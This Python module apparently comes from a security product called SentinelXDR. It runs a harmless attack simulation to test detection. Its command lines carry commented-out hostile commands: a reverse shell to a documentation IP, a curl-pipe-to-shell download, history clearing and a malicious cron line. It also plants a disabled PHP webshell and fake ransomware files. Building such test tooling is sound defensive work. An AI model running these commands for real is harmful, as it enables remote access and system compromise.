"""Simulación de ataques INOFENSIVA para validar detección y respuesta.

Cada técnica genera artefactos o líneas de comando que imitan a las reales
pero no hacen nada dañino (los comandos peligrosos van comentados, las IPs son
de rangos de documentación TEST-NET y los binarios son copias de 'sleep').
"""
from __future__ import annotations

import os
import shutil
import subprocess
import sys
import time

SIM_DIR = "/tmp/.xdr-sim"
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
ARTIFACTS = ["/tmp/xdr-sim-eicar.com", "/tmp/xdr-sim-shell.php", "/etc/cron.d/xdr-sim",
             "/var/www/html/xdr-sim-shell.php"]


def _step(msg: str) -> None:
    print(f"  \033[36m→\033[0m {msg}")


def _spawn(args: list[str], argv0: str | None = None) -> subprocess.Popen:
    return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True, executable=argv0)


def run_simulation(auth_log: str | None = None, ransomware_dir: str | None = None) -> None:
    print("\nSimulación de ataque SentinelXDR (inofensiva). Observe la consola web.\n")
    os.makedirs(SIM_DIR, exist_ok=True)
    sleep_bin = shutil.which("sleep") or "/bin/sleep"
    procs: list[subprocess.Popen] = []

    _step("T1204  Descarga de fichero EICAR en /tmp")
    with open("/tmp/xdr-sim-eicar.com", "w") as fh:
        fh.write(EICAR)

    _step("T1505.003  Webshell PHP de prueba")
    shell_dir = "/var/www/html" if os.path.isdir("/var/www/html") and os.access("/var/www/html", os.W_OK) else "/tmp"
    with open(os.path.join(shell_dir, "xdr-sim-shell.php"), "w") as fh:
        fh.write("<?php /* SentinelXDR simulacion */ if(false){ system($_GET['cmd']); } ?>\n")

    _step("T1036.005  Binario que suplanta un hilo del kernel desde directorio oculto")
    fake = os.path.join(SIM_DIR, "kworkerd")
    shutil.copy(sleep_bin, fake)
    os.chmod(fake, 0o755)
    procs.append(_spawn([fake, "120"]))

    _step("T1496  Criptominero simulado (sleep renombrado a xmrig)")
    miner = os.path.join(SIM_DIR, "xmrig")
    shutil.copy(sleep_bin, miner)
    os.chmod(miner, 0o755)
    procs.append(_spawn([miner, "120"]))

    _step("T1059.004  Línea de comandos de reverse shell (comentada, no conecta)")
    # el "; true" evita que bash sustituya el proceso por sleep (exec implícito)
    procs.append(_spawn(["bash", "-c", "sleep 60; true # bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"]))

    _step("T1105  Patrón curl | sh (comentado)")
    procs.append(_spawn(["sh", "-c", "sleep 60 # curl -s http://malware.testing.google.test/x.sh | sh"]))

    _step("T1070.003  Borrado de historial (comentado)")
    procs.append(_spawn(["sh", "-c", "sleep 60 # history -c; unset HISTFILE"]))

    if os.access("/etc/cron.d", os.W_OK):
        _step("T1053.003  Tarea cron con descarga (solo comentario, cron no la ejecuta)")
        with open("/etc/cron.d/xdr-sim", "w") as fh:
            fh.write("# SentinelXDR simulacion - no ejecuta nada\n"
                     "# */5 * * * * root curl -fsSL http://example.invalid/p.sh | sh\n")
    else:
        _step("(omitido cron: requiere root)")

    if auth_log:
        _step(f"T1110  Fuerza bruta SSH simulada en {auth_log}")
        stamp = time.strftime("%b %d %H:%M:%S")
        host = os.uname().nodename
        with open(auth_log, "a") as fh:
            for i in range(8):
                fh.write(f"{stamp} {host} sshd[{4000 + i}]: Failed password for invalid user admin"
                         f" from 203.0.113.66 port {50000 + i} ssh2\n")
            fh.write(f"{stamp} {host} sshd[4100]: Accepted password for xdrsim from 203.0.113.66"
                     f" port 50100 ssh2\n")

    if ransomware_dir:
        _step(f"T1486  Cifrado masivo simulado en {ransomware_dir}")
        target = os.path.join(ransomware_dir, "xdr-sim-ransom")
        os.makedirs(target, exist_ok=True)
        time.sleep(6)  # permitir que el sensor registre el directorio
        for i in range(40):
            with open(os.path.join(target, f"documento_{i}.docx.xdrsim"), "wb") as fh:
                fh.write(os.urandom(8192))
        with open(os.path.join(target, "README_DECRYPT.txt"), "w") as fh:
            fh.write("SIMULACION: Your files have been encrypted. Send bitcoin to decrypt.\n")

    print("\nSimulación lanzada. Espere ~30 s y revise alertas/incidentes en la consola.")
    print("Limpieza: sentinel-xdr simulate --cleanup\n")
    sys.stdout.flush()


def cleanup() -> None:
    subprocess.run(["pkill", "-f", SIM_DIR], check=False)
    subprocess.run(["pkill", "-f", "dev/tcp/203.0.113.66"], check=False)
    subprocess.run(["pkill", "-f", "malware.testing.google.test"], check=False)
    subprocess.run(["pkill", "-f", "history -c; unset HISTFILE"], check=False)
    for path in ARTIFACTS:
        try:
            os.remove(path)
        except OSError:
            pass
    shutil.rmtree(SIM_DIR, ignore_errors=True)
    for root in ("/home", "/root", "/srv", "/tmp"):
        for dirpath, dirnames, _ in os.walk(root):
            if "xdr-sim-ransom" in dirnames:
                shutil.rmtree(os.path.join(dirpath, "xdr-sim-ransom"), ignore_errors=True)
            if dirpath.count(os.sep) > 4:
                dirnames[:] = []
